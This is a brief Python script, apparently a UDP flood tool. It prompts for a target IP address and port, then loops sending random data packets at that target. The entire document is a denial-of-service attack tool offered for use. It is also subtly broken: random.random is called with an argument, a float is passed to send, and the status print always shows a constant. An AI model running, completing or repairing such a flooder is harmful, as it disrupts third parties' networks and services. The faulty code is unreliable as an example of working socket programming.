import socket, random, time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter Target IP: ")

port = int(input("Enter Target Port: "))

s.connect((ip, port))

for i in range(10109, 100**1000):

    s.send(random.random(10)*1000)
    print(f"Send: {1}")